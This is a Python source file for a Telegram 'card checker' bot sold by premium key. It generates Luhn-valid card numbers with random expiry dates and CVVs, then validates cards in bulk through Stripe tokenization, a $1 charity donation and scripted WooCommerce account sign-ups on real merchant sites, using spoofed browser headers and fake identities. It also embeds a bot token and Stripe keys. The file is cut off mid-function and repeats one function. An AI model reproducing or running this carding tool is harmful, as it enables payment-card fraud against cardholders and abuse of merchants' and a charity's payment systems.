#!/usr/bin/env python
import logging
import requests
import asyncio
import re
import json
import os
import random
import time
import uuid
import urllib.parse
import hmac
import hashlib
import base64
from datetime import datetime, timedelta
from fake_useragent import UserAgent
import aiohttp
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ConversationHandler, ContextTypes
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.error import Forbidden, NetworkError
from concurrent.futures import ThreadPoolExecutor, as_completed
from bs4 import BeautifulSoup

# Configure logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Bot configuration
BOT_TOKEN = "7646562599:AAFxT8lHyAN7kjxQN737UA1diilkC6v3ai4"
OWNER_ID = 1805944073  # Owner Telegram ID
ADMIN_IDS = [1805944073]  # Admin IDs

# Command locks for rate limiting
COMMAND_LOCKS = {}
PREMIUM_GROUP_ID = -1001510453323  # Your premium group ID
OFFICIAL_GROUP = -1001510453323  # Your official group ID
CHANNEL_ID = -100123456789  # Your channel ID
BOT_USERNAME = "@your_bot_username"  # Your bot username

# File paths
REGISTERED_USERS_FILE = 'registered_users.txt'
PREMIUM_USERS_FILE = 'premium_users.txt'
PREMIUM_KEYS_FILE = 'premium_keys.txt'

# Conversation states
SELECT_BIN_TYPE, SELECT_DIGITS = range(2)

# Bin types for BIN generation
BIN_TYPES = {
    '1': 'Visa 4',
    '2': 'Mastercard 5',
    '3': 'American Express 3',
    '4': 'Discover 6'
}

# API Constants
STRIPE_PK = "pk_live_sd4VzXOpmDU8DIdWT77qHT1q"
RANDOM_USER_API = "https://randomuser.me/api/?nat=us"
BIN_CHECKER_API = "https://bins.antipublic.cc/bins/"
STRIPE_KEY = "pk_live_51PGzH0CHkCOwzzTu9c6qvusREh4UxRGjldkEitLYyhxzMrXky5loofeHZrMni5bXOG7oTHvJ0eOImw9vlFTRRVjR009dFq9WHT"

# Global variables for user sessions
USER_SESSIONS = {}
MASS_CHECK_ACTIVE = {}
MAX_CONCURRENT_CHECKS = 50  # Adjust based on your VPS capacity

def gets(text, start_str, end_str):
    """Helper function to extract string between two substrings"""
    try:
        start = text.index(start_str) + len(start_str)
        end = text.index(end_str, start)
        return text[start:end]
    except ValueError:
        return None

def load_premium_users():
    try:
        with open(PREMIUM_USERS_FILE, 'r') as f:
            return [int(line.strip()) for line in f.readlines()]
    except FileNotFoundError:
        return []

def save_premium_user(user_id, days):
    expiry_date = datetime.now() + timedelta(days=days)
    with open(PREMIUM_USERS_FILE, 'a') as f:
        f.write(f"{user_id}|{expiry_date.isoformat()}\n")

def is_premium_user(user_id):
    try:
        with open(PREMIUM_USERS_FILE, 'r') as f:
            for line in f.readlines():
                parts = line.strip().split('|')
                if len(parts) == 2 and int(parts[0]) == user_id:
                    expiry_date = datetime.fromisoformat(parts[1])
                    if datetime.now() < expiry_date:
                        return True
        return False
    except FileNotFoundError:
        return False

def generate_premium_key(days, quantity=1):
    keys = []
    for _ in range(quantity):
        key = f"premium_{''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=16))}"
        keys.append(f"{key}|{days}")
    return keys

def save_premium_keys(keys):
    with open(PREMIUM_KEYS_FILE, 'a') as f:
        for key in keys:
            f.write(f"{key}\n")

def redeem_key(key):
    try:
        with open(PREMIUM_KEYS_FILE, 'r') as f:
            lines = f.readlines()

        found = None
        remaining_keys = []
        for line in lines:
            parts = line.strip().split('|')
            if len(parts) == 2:
                if parts[0] == key:
                    found = int(parts[1])
                else:
                    remaining_keys.append(line)

        if found:
            with open(PREMIUM_KEYS_FILE, 'w') as f:
                f.writelines(remaining_keys)
            return found
        return None
    except FileNotFoundError:
        return None

async def check_user_access(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    chat_type = update.effective_chat.type

    # Owner and admins have full access everywhere
    if user_id == OWNER_ID or user_id in ADMIN_IDS:
        return True

    # Always allow in official group
    if chat_id == OFFICIAL_GROUP:
        return True

    # Allow registered users in groups
    if chat_type in ["group", "supergroup"]:
        if await Commands.is_registered(user_id):
            return True
        else:
            await update.message.reply_text("❗️ You need to register first! Use /register")
            return False

    # Private chat checks
    if chat_type == "private":
        if is_premium_user(user_id):
            return True
        else:
            await update.message.reply_text(
                "❗️ Premium required for private chat!\n"
                "Join our official group or get premium access.\n"
                "Contact @mumiru for premium."
            )
            return False

    # Default deny for unknown chat types
    return False

async def get_bin_info(bin_number: str) -> dict:
    """Fetch BIN information from multiple lookup APIs with fallback"""
    try:
        headers = {
            'User-Agent': UserAgent().random,
            'Accept': 'application/json'
        }

        async def try_binlist_net():
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(f"https://lookup.binlist.net/{bin_number}", headers=headers) as response:
                        if response.status == 200:
                            data = await response.json()
                            return {
                                'brand': data.get('scheme', 'Unknown'),
                                'bank': data.get('bank', {}).get('name', 'Unknown'),
                                'country_name': data.get('country', {}).get('name', 'Unknown'),
                                'country_code': data.get('country', {}).get('alpha2', 'N/A'),
                                'currency': data.get('country', {}).get('currency', 'USD'),
                                'type': data.get('type', 'Unknown'),
                                'level': data.get('level', 'Unknown')
                            }
            except Exception:
                pass
            return None

        async def try_bins_antipublic():
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}", headers=headers) as response:
                        if response.status == 200:
                            data = await response.json()
                            return {
                                'brand': data.get('brand', 'Unknown'),
                                'bank': data.get('bank', 'Unknown'),
                                'country_name': data.get('country_name', 'Unknown'),
                                'country_code': data.get('country_code', 'N/A'),
                                'currency': data.get('currency', 'USD'),
                                'type': data.get('type', 'Unknown'),
                                'level': data.get('level', 'Unknown')
                            }
            except Exception:
                pass
            return None

        # Try primary lookup service
        result = await try_binlist_net()
        if result:
            return result

        # Try fallback service
        result = await try_bins_antipublic()
        if result:
            return result

        # Return default if all lookups fail
        return {
            'brand': 'Unknown',
            'bank': 'Unknown', 
            'country_name': 'Unknown',
            'country_code': 'N/A',
            'currency': 'USD',
            'type': 'Unknown',
            'level': 'Unknown'
        }
    except Exception as e:
        logger.error(f"Error fetching BIN info: {str(e)}")
        return {
            'brand': 'Unknown',
            'bank': 'Unknown',
            'country_name': 'Unknown',
            'country_code': 'N/A',
            'currency': 'USD',
            'type': 'Unknown',
            'level': 'Unknown'
        }

class CardChecker:
    @staticmethod
    async def check_bin(bin_number: str) -> dict:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"{BIN_CHECKER_API}{bin_number}") as response:
                    return await response.json()
        except Exception as e:
            logger.error(f"Error checking BIN: {str(e)}")
            return None

    @staticmethod
    async def get_stripe_token(number: str, month: str, year: str, cvc: str) -> str:
        headers = {
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://js.stripe.com',
            'Referer': 'https://js.stripe.com/',
            'User-Agent': UserAgent().random,
            'sec-ch-ua': '"Chromium";v="91", " Not;A Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site'
        }
        data = {
            'card[number]': number,
            'card[cvc]': cvc,
            'card[exp_month]': month,
            'card[exp_year]': year,
            'payment_user_agent': 'stripe.js/7fa1d9b9; stripe-js-v3/7fa1d9b9',
            'time_on_page': '60914',
            'key': STRIPE_PK
        }

        try:
            async with aiohttp.ClientSession() as session:
                async with session.post('https://api.stripe.com/v1/tokens', headers=headers, data=data) as response:
                    if response.status == 200:
                        result = await response.json()
                        return result.get('id')
                    return None
        except Exception as e:
            logger.error(f"Error getting Stripe token: {str(e)}")
            return None

    @staticmethod
    async def process_payment(token: str, first_name: str, last_name: str) -> dict:
        headers = {
            'Accept': '*/*',
            'Content-Type': 'application/json',
            'Origin': 'https://rhcollaborative.org',
            'User-Agent': UserAgent().random
        }
        params = {
            'account_id': 'act_f5d15c354806',
            'donation_type': 'cc',
            'amount_in_cents': '100',
            'form_id': 'frm_3fe8af6a5f28',
        }
        json_data = {
            'first_name': first_name,
            'last_name': last_name,
            'email': f"{first_name.lower()}.{last_name.lower()}@example.com",
            'payment_auth': '{"stripe_token":"' + token + '"}',
        }

        try:
            async with aiohttp.ClientSession() as session:
                async with session.post('https://api.donately.com/v2/donations', 
                                      params=params, headers=headers, json=json_data) as response:
                    return await response.json()
        except Exception as e:
            logger.error(f"Error processing payment: {str(e)}")
            return {"error": str(e)}

    @staticmethod
    async def visit_website(cc_number, exp_month, exp_year, cvc):
        try:
            async with aiohttp.ClientSession() as session:
                # Generate random user credentials
                user_id = random.randint(9999, 574545)
                username = f"cristnik1{user_id}"
                email = f"cristnik1{user_id}@mml.com"

                # First request to get register nonce
                headers = {
                    'User-Agent': UserAgent().random,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Connection': 'keep-alive',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'none',
                    'Sec-Fetch-User': '?1',
                    'Upgrade-Insecure-Requests': '1',
                }

                async with session.get('https://bombayonthebeach.co/my-account/', headers=headers) as response:
                    response_text = await response.text()
                    soup = BeautifulSoup(response_text, 'html.parser')
                    nonce_input = soup.find('input', {'id': 'woocommerce-register-nonce'})
                    if not nonce_input:
                        return {
                            'status': 'error',
                            'message': 'Could not find registration nonce',
                            'card': f'{cc_number[:6]}******{cc_number[-4:]}',
                            'expiry': f'{exp_month}/{exp_year}'
                        }
                    register_nonce = nonce_input['value']

                    # Register the user
                    headers = {
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                        'Accept-Language': 'en-US,en;q=0.9',
                        'Cache-Control': 'max-age=0',
                        'Connection': 'keep-alive',
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Origin': 'https://bombayonthebeach.co',
                        'Referer': 'https://bombayonthebeach.co/my-account/',
                        'Sec-Fetch-Dest': 'document',
                        'Sec-Fetch-Mode': 'navigate',
                        'Sec-Fetch-Site': 'same-origin',
                        'Sec-Fetch-User': '?1',
                        'Upgrade-Insecure-Requests': '1',
                        'User-Agent': UserAgent().random,
                    }

                    data = {
                        'email': email,
                        'email_2': '',
                        'mailchimp_woocommerce_newsletter': '1',
                        'wc_order_attribution_source_type': 'typein',
                        'wc_order_attribution_referrer': '(none)',
                        'wc_order_attribution_utm_campaign': '(none)',
                        'wc_order_attribution_utm_source': '(direct)',
                        'wc_order_attribution_utm_medium': '(none)',
                        'wc_order_attribution_utm_content': '(none)',
                        'wc_order_attribution_utm_id': '(none)',
                        'wc_order_attribution_utm_term': '(none)',
                        'wc_order_attribution_utm_source_platform': '(none)',
                        'wc_order_attribution_utm_creative_format': '(none)',
                        'wc_order_attribution_utm_marketing_tactic': '(none)',
                        'wc_order_attribution_session_entry': 'https://bombayonthebeach.co/my-account/',
                        'wc_order_attribution_session_start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                        'wc_order_attribution_session_pages': '4',
                        'wc_order_attribution_session_count': '3',
                        'wc_order_attribution_user_agent': UserAgent().random,
                        'woocommerce-register-nonce': register_nonce,
                        '_wp_http_referer': '/my-account/',
                        'register': 'Register',
                    }

                    await session.post('https://bombayonthebeach.co/my-account/', headers=headers, data=data)

                    # Get payment methods page
                    headers = {
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                        'Accept-Language': 'en-US,en;q=0.9',
                        'Connection': 'keep-alive',
                        'Referer': 'https://bombayonthebeach.co/my-account/',
                        'Sec-Fetch-Dest': 'document',
                        'Sec-Fetch-Mode': 'navigate',
                        'Sec-Fetch-Site': 'same-origin',
                        'Sec-Fetch-User': '?1',
                        'Upgrade-Insecure-Requests': '1',
                        'User-Agent': UserAgent().random,
                    }

                    async with session.get('https://bombayonthebeach.co/my-account/payment-methods/', headers=headers) as response:
                        payment_page_text = await response.text()
                        add_card_nonce = gets(payment_page_text, 'add_card_nonce":"', '"')
                        if not add_card_nonce:
                            return {
                                'status': 'error',
                                'message': 'Could not find add card nonce',
                                'card': f'{cc_number[:6]}******{cc_number[-4:]}',
                                'expiry': f'{exp_month}/{exp_year}'
                            }

                        # Create payment method with Stripe
                        headers = {
                            'Accept': 'application/json',
                            'Accept-Language': 'en-US,en;q=0.9',
                            'Connection': 'keep-alive',
                            'Content-Type': 'application/x-www-form-urlencoded',
                            'Origin': 'https://js.stripe.com',
                            'Referer': 'https://js.stripe.com/',
                            'Sec-Fetch-Dest': 'empty',
                            'Sec-Fetch-Mode': 'cors',
                            'Sec-Fetch-Site': 'same-site',
                            'User-Agent': UserAgent().random,
                        }

                        data = {
                            'type': 'card',
                            'billing_details[name]': 'wilam ougth',
                            'billing_details[email]': email,
                            'card[number]': cc_number,
                            'card[cvc]': cvc,
                            'card[exp_month]': exp_month,
                            'card[exp_year]': exp_year,
                            'guid': str(uuid.uuid4()),
                            'muid': str(uuid.uuid4()),
                            'sid': str(uuid.uuid4()),
                            'payment_user_agent': 'stripe.js/5d3c74e219; stripe-js-v3/5d3c74e219; split-card-element',
                            'referrer': 'https://bombayonthebeach.co',
                            'time_on_page': str(random.randint(500000, 700000)),
                            'key': 'pk_live_UqbFqD1q02UEq0bi03lomg8z00Ab2Knip7',
                        }

                        async with session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data) as response:
                            response_json = await response.json()
                            if 'id' in response_json:
                                payment_method_id = response_json['id']

                                # Finalize the setup
                                headers = {
                                    'Accept': 'application/json, text/javascript, */*; q=0.01',
                                    'Accept-Language': 'en-US,en;q=0.9',
                                    'Connection': 'keep-alive',
                                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                                    'Origin': 'https://bombayonthebeach.co',
                                    'Referer': 'https://bombayonthebeach.co/my-account/add-payment-method/',
                                    'Sec-Fetch-Dest': 'empty',
                                    'Sec-Fetch-Mode': 'cors',
                                    'Sec-Fetch-Site': 'same-origin',
                                    'User-Agent': UserAgent().random,
                                    'X-Requested-With': 'XMLHttpRequest',
                                }

                                params = {
                                    'wc-ajax': 'wc_stripe_create_setup_intent',
                                }

                                data = {
                                    'stripe_source_id': payment_method_id,
                                    'nonce': add_card_nonce,
                                }

                                async with session.post('https://bombayonthebeach.co/', params=params, headers=headers, data=data) as final_response:
                                    final_text = await final_response.text()
                                    if '"result":"success"' in final_text.lower():
                                        return {
                                            'status': 'success',
                                            'message': 'Card successfully validated',
                                            'card': f'{cc_number[:6]}******{cc_number[-4:]}',
                                            'expiry': f'{exp_month}/{exp_year}',
                                            'brand': response_json.get('card', {}).get('brand', 'Unknown'),
                                            'country': response_json.get('card', {}).get('country', 'Unknown')
                                        }
                                    else:
                                        error_msg = gets(final_text, '"message":"', '"') or final_text[:200]
                                        return {
                                            'status': 'failed',
                                            'message': error_msg,
                                            'card': f'{cc_number[:6]}******{cc_number[-4:]}',
                                            'expiry': f'{exp_month}/{exp_year}'
                                        }
                            else:
                                error_msg = response_json.get('error', {}).get('message', 'Unknown error')
                                return {
                                    'status': 'failed',
                                    'message': error_msg,
                                    'card': f'{cc_number[:6]}******{cc_number[-4:]}',
                                    'expiry': f'{exp_month}/{exp_year}'
                                }
        except Exception as e:
            logger.error(f"Error in visit_website: {str(e)}")
            return {
                'status': 'error',
                'message': str(e),
                'card': f'{cc_number[:6]}******{cc_number[-4:]}' if cc_number else 'N/A',
                'expiry': f'{exp_month}/{exp_year}' if exp_month and exp_year else 'N/A'
            }

class Commands:
    # Command locks and cooldowns
    COMMAND_LOCKS = {}
    USER_COOLDOWNS = {}

    @staticmethod
    def check_cooldown(user_id: int, is_mass_check: bool = False) -> tuple[bool, int]:
        """Check if user is in cooldown and get remaining time"""
        if user_id not in Commands.USER_COOLDOWNS:
            return False, 0
            
        cooldown_end = Commands.USER_COOLDOWNS[user_id]
        now = datetime.now()
        
        if now < cooldown_end:
            remaining = int((cooldown_end - now).total_seconds())
            return True, remaining
            
        return False, 0

    @staticmethod
    def set_cooldown(user_id: int, is_premium: bool, is_mass_check: bool = False):
        """Set cooldown for user based on their status"""
        cooldown = 0
        if is_premium:
            cooldown = 10 if is_mass_check else 5
        else:
            cooldown = 25 if is_mass_check else 10
            
        Commands.USER_COOLDOWNS[user_id] = datetime.now() + timedelta(seconds=cooldown)

    @staticmethod
    def get_cc_limit(is_premium: bool) -> int:
        """Get CC check limit based on user status"""
        return 250 if is_premium else 50
    @staticmethod
    async def is_registered(user_id: int) -> bool:
        try:
            with open(REGISTERED_USERS_FILE, 'r') as f:
                registered_users = f.read().splitlines()
                return str(user_id) in registered_users
        except FileNotFoundError:
            return False

    @staticmethod
    async def register_user(user_id: int) -> None:
        with open(REGISTERED_USERS_FILE, 'a') as f:
            f.write(f"{user_id}\n")

    @staticmethod
    async def register_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        user_id = update.effective_user.id
        if await Commands.is_registered(user_id):
            await update.message.reply_text("You are already registered! ✅")
            return

        await Commands.register_user(user_id)
        await update.message.reply_text(
            "✅ Registration successful!\n"
            "You can now use all bot features.\n"
            "Type /start to begin!"
        )

    @staticmethod
    async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        user_id = update.effective_user.id
        if not await Commands.is_registered(user_id):
            await update.message.reply_text(
                "❗️ You need to register first to use this bot!\n"
                "Send /register to register."
            )
            return

        keyboard = [
            [InlineKeyboardButton("Commands List 📋", callback_data='cmds')],
            [InlineKeyboardButton("Generate Random User 👤", callback_data='random_user')],
            [InlineKeyboardButton("Check Cards 💳", callback_data='cards')],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            "Welcome to the Multi-Purpose Bot!\n"
            "Created by @mumirudarkside\n"
            "Join: https://t.me/addlist/CdzXIdzTkZc4ZjNl",
            reply_markup=reply_markup
        )

    @staticmethod
    async def key_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Generate premium keys (owner/admin only)"""
        user_id = update.effective_user.id
        if user_id != OWNER_ID and user_id not in ADMIN_IDS:
            await update.message.reply_text("❌ This command is for owners/admins only!")
            return

        if len(context.args) < 2:
            await update.message.reply_text("Usage: /key <quantity> <days>\nExample: /key 5 30")
            return

        try:
            quantity = int(context.args[0])
            days = int(context.args[1])

            if quantity <= 0 or days <= 0:
                await update.message.reply_text("Quantity and days must be positive numbers")
                return

            keys = generate_premium_key(days, quantity)
            save_premium_keys(keys)

            key_list = "\n".join([f"`{k.split('|')[0]}`" for k in keys])
            await update.message.reply_text(
                f"✅ Generated {quantity} premium keys for {days} days:\n\n"
                f"{key_list}\n\n"
                f"Use /redeem <key> to activate premium.",
                parse_mode='Markdown'
            )
        except ValueError:
            await update.message.reply_text("Invalid input. Usage: /key <quantity> <days>")

    @staticmethod
    async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Redeem a premium key"""
        user_id = update.effective_user.id

        if len(context.args) < 1:
            await update.message.reply_text("Usage: /redeem <key>\nExample: /redeem premium_abc123")
            return

        key = context.args[0]
        days = redeem_key(key)

        if days is None:
            await update.message.reply_text("❌ Invalid or expired premium key!")
            return

        save_premium_user(user_id, days)
        await update.message.reply_text(
            f"✅ Premium activated for {days} days!\n\n"
            f"You now have access to all features in private chat."
        )

    @staticmethod
    async def degrade_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Remove premium from a user (owner/admin only)"""
        user_id = update.effective_user.id
        if user_id != OWNER_ID and user_id not in ADMIN_IDS:
            await update.message.reply_text("❌ This command is for owners/admins only!")
            return

        target_id = None
        if update.message.reply_to_message:
            target_id = update.message.reply_to_message.from_user.id
        elif len(context.args) > 0:
            try:
                target_id = int(context.args[0])
            except ValueError:
                await update.message.reply_text("Invalid user ID format")
                return

        if not target_id:
            await update.message.reply_text("Please reply to a user's message or provide their ID")
            return

        try:
            # Read all premium users
            with open(PREMIUM_USERS_FILE, 'r') as f:
                lines = f.readlines()

            # Filter out the target user
            remaining_users = []
            for line in lines:
                parts = line.strip().split('|')
                if len(parts) == 2 and int(parts[0]) != target_id:
                    remaining_users.append(line)

            # Write back the remaining users
            with open(PREMIUM_USERS_FILE, 'w') as f:
                f.writelines(remaining_users)

            await update.message.reply_text(f"✅ Removed premium access for user {target_id}")
        except Exception as e:
            await update.message.reply_text(f"Error removing premium: {str(e)}")

    @staticmethod
    async def premium_info_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Show premium status information"""
        user = update.effective_user
        is_premium = is_premium_user(user.id)
        expiry_date = None

        if is_premium:
            with open(PREMIUM_USERS_FILE, 'r') as f:
                for line in f.readlines():
                    parts = line.strip().split('|')
                    if len(parts) == 2 and int(parts[0]) == user.id:
                        expiry_date = datetime.fromisoformat(parts[1])
                        break

        # Get join date from registered users file
        join_date = None
        try:
            with open(REGISTERED_USERS_FILE, 'r') as f:
                for line in f.readlines():
                    if str(user.id) in line:
                        join_date = line.strip().split('|')[1]
                        break
        except:
            join_date = "Unknown"

        response = f"""———————
- ID: {user.id}
- Username: @{user.username or 'None'} 
- Plan: {'Premium 👑' if is_premium else 'Free User 👤'}

[※]》 Joined At: {join_date or 'Unknown'}
[※]》Referrals: 0
[※]》 Expires At: {expiry_date.strftime('%Y-%m-%d') if expiry_date else 'N/A'}"""
        await update.message.reply_text(response)

    @staticmethod
    async def cmds(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        if not await check_user_access(update, context):
            return

        keyboard = [
            [InlineKeyboardButton("Stripe", callback_data='stripe')],
            [InlineKeyboardButton("Other Options", callback_data='other')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        msg = update.callback_query.message if update.callback_query else update.message
        await msg.reply_text('Please choose an option:', reply_markup=reply_markup)

    @staticmethod
    async def gbin_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
        if not await check_user_access(update, context):
            return ConversationHandler.END

        try:
            amount = int(context.args[0])
            if amount <= 0:
                await update.message.reply_text("Please provide a positive number greater than 0.")
                return ConversationHandler.END

            context.user_data['amount'] = amount
            reply_text = "Which BIN type do you want?\n\n"
            reply_text += "1. Visa \n2. Mastercard \n3. American Express \n4. Discover"

            await update.message.reply_text(reply_text)
            return SELECT_BIN_TYPE

        except (IndexError, ValueError):
            await update.message.reply_text("Usage: /gbin <amount>")
            returnConversationHandler.END

    @staticmethod
    async def select_bin_type(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
        if not await check_user_access(update, context):
            return ConversationHandler.END

        choice = update.message.text.strip()
        if choice not in BIN_TYPES:
            await update.message.reply_text("Invalid choice. Please select a number from the options.")
            return SELECT_BIN_TYPE

        bin_prefix = BIN_TYPES[choice].split()[-1]
        context.user_data['bin_prefix'] = bin_prefix
        return await Commands.select_digits(update, context)

    @staticmethod
    async def select_digits(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
        if not await check_user_access(update, context):
            return ConversationHandler.END

        amount = context.user_data['amount']
        bin_prefix = context.user_data['bin_prefix']
        digits = 6  # Always generate 6-digit BINs

        bins = []
        for _ in range(amount):
            remaining_digits = digits - len(bin_prefix)
            random_part = ''.join([str(random.randint(0, 9)) for _ in range(remaining_digits)])
            # Ensure Discover cards start with 6
            if bin_prefix == '6':  # Discover prefix
                bins.append('6' + random_part)
            else:
                bins.append(bin_prefix + random_part)

        if amount <= 10:
            await update.message.reply_text("\n".join(bins))
        else:
            with open('bins.txt', 'w') as f:
                f.write("\n".join(bins))
            with open('bins.txt', 'rb') as f:
                await update.message.reply_document(document=f, filename='bins.txt')
            os.remove('bins.txt')

        return ConversationHandler.END

    @staticmethod
    def luhn_check(card_number: str) -> bool:
        """Implement Luhn algorithm for card validation"""
        digits = [int(d) for d in str(card_number)]
        odd_digits = digits[-1::-2]
        even_digits = digits[-2::-2]
        checksum = sum(odd_digits)
        for d in even_digits:
            checksum += sum(divmod(d * 2, 10))
        return checksum % 10 == 0

    @staticmethod
    async def gen_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        if not await check_user_access(update, context):
            return

        try:
            if len(context.args) != 2:
                await update.message.reply_text("Usage: /gen <bin> <amount>\nExample: /gen 424242 10")
                return

            bin_num = context.args[0].strip()
            try:
                amount = int(context.args[1])
            except (ValueError, IndexError):
                await update.message.reply_text("Amount must be a valid number")
                return

            if not bin_num.isdigit():
                await update.message.reply_text("BIN must contain only numbers")
                return

            if len(bin_num) < 6:
                await update.message.reply_text("BIN must be at least 6 digits")
                return

            if amount <= 0 or amount > 100:
                await update.message.reply_text("Amount must be between 1 and 100")
                return

            if bin_num.startswith('3'):
                card_length = 15  # Amex
            elif bin_num.startswith(('30', '36', '38', '39')):
                card_length = 14  # Diners Club
            else:
                card_length = 16  # Visa, MC, Discover, etc.

            cards = []
            for _ in range(amount):
                while True:
                    remaining_length = card_length - len(bin_num)
                    card_number = bin_num + ''.join([str(random.randint(0, 9)) for _ in range(remaining_length)])
                    if Commands.luhn_check(card_number):
                        exp_month = str(random.randint(1, 12)).zfill(2)
                        exp_year = str(random.randint(2024, 2030))
                        cvv = ''.join([str(random.randint(0, 9)) for _ in range(3)])
                        cards.append(f"{card_number}|{exp_month}|{exp_year}|{cvv}")
                        break

            bin_info = await get_bin_info(bin_num[:6])

            if amount <= 10:
                message = (
                    "Card Generator\n"
                    "━━━━━━━━━━━━━━━━━\n"
                    f"[ᛋ] Bin: {bin_num}xxxx|{random.randint(1,12):02d}|20{random.randint(23,30)}|rnd\n"
                    "━━━━━━━━━━━━━━━━━\n" +
                    "\n".join([f"`{card}`" for card in cards]) + "\n"
                    "━━━━━━━━━━━━━━━━━\n"
                    f"[ᛋ] Info: {bin_info.get('brand', 'Unknown')}\n"
                    f"[ᛋ] Bank: {bin_info.get('bank', 'Unknown')}\n"
                    f"[ᛋ] Country: {bin_info.get('country_name', 'Unknown')}\n"
                    "━━━━━━━━━━━━━━━━━\n"
                    f"[ᛋ] Generate by: @{update.effective_user.username}"
                )

                await update.message.reply_text(message, parse_mode='MarkdownV2')
            else:
                with open('cards.txt', 'w') as f:
                    f.write("\n".join(cards))
                with open('cards.txt', 'rb') as f:
                    await update.message.reply_document(
                        document=f,
                        filename='cards.txt',
                        caption=f"Generated {amount} cards from BIN {bin_num}\nGenerated by: @{update.effective_user.username}"
                    )
                os.remove('cards.txt')

        except Exception as e:
            logger.error(f"Error in gen_command: {str(e)}")
            await update.message.reply_text("Usage: /gen <bin> <amount>")

    @staticmethod
    async def check_card(cc_data: str, update: Update) -> str:
        try:
            number, month, year, cvc = cc_data.split("|")

            # Get random user data for the transaction
            async with aiohttp.ClientSession() as session:
                async with session.get(RANDOM_USER_API) as response:
                    user_data = (await response.json())['results'][0]
                    first_name = user_data['name']['first']
                    last_name = user_data['name']['last']

            # Get Stripe token
            stripe_token = await CardChecker.get_stripe_token(number, month, year, cvc)
            if not stripe_token:
                return "❌ Error: Could not get token"

            # Process payment
            payment_result = await CardChecker.process_payment(stripe_token, first_name, last_name)
            result = payment_result.get('message', 'Unknown response')

            # Get BIN info
            bin_info = await CardChecker.check_bin(number[:6])

            # Format response
            response = f"""━━━━━━━━━━━━━━━
📌 𝗖𝗵𝗲𝗰𝗸𝗼𝘂𝘁 𝗗𝗲𝘁𝗮𝗶𝗹𝘀 🔥
━━━━━━━━━━━━━━━

💳 𝗖𝗮𝗿𝗱 ➜ {number}|{month}|{year}|{cvc}
🚪 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➜ Stripe 1$
📡 𝗦𝘁𝗮𝘁𝘂𝘀 ➜ {'✅' if 'success' in result.lower() else '❌'}
⚡ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ {result}

━━━━━━━━━━━━━━━"""

            if bin_info:
                response += f"""
━━━━━━━━━━━━━━━
𝗕𝗶𝗻 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻
━━━━━━━━━━━━━━━

🔍 𝗕𝗶𝗻 ➜ {number[:6]}
🏷️ 𝗕𝗿𝗮𝗻𝗱 ➜ {bin_info.get('brand', 'N/A')}
🌍 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➜ {bin_info.get('country_code', 'N/A')}
🇨🇴 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 𝗡𝗮𝗺𝗲 ➜ {bin_info.get('country_name', 'N/A')}
🏦 𝗕𝗮𝗻𝗸 ➜ {bin_info.get('bank', 'N/A')}
📶 𝗟𝗲𝘃𝗲𝗹 ➜ {bin_info.get('level', 'N/A')}
📌 𝗧𝘆𝗽𝗲 ➜ {bin_info.get('type', 'N/A')}

━━━━━━━━━━━━━━━
𝗥𝗲𝗾 ⌁ @{update.effective_user.username or 'N/A'}
𝗗𝗲𝘃𝗕𝘆 ⌁ @mumiru
━━━━━━━━━━━━━━━"""

            return response

        except Exception as e:
            return f"Error: {str(e)}"

    @staticmethod
    async def gen_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        if not await check_user_access(update, context):
            return

        try:
            if len(context.args) != 2:
                await update.message.reply_text("Usage: /gen <bin> <amount>\nExample: /gen 424242 10")
                return

            bin_num = context.args[0].strip()
            try:
                amount = int(context.args[1])
            except (ValueError, IndexError):
                await update.message.reply_text("Amount must be a valid number")
                return

            if not bin_num.isdigit():
                await update.message.reply_text("BIN must contain only numbers")
